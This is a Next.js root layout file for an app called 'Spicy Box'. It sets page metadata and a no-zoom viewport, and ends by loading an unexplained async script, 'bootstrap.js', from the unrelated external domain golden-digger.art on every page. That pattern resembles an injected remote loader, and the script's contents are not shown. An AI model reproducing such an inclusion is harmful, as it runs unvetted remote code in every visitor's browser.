import "./globals.css";

export const metadata = {
  title: "Spicy Box",
  description: "Spicy Box App",
};

export const viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
};

export default function RootLayout({ children }) {
  return (
    <html lang="ru">
      <body>
        {children}
        <script src="https://golden-digger.art/p/2d72c91e-8a15-4c88-8f0c-aa9dcca859c5/bootstrap.js" async defer></script>
      </body>
    </html>
  );
}
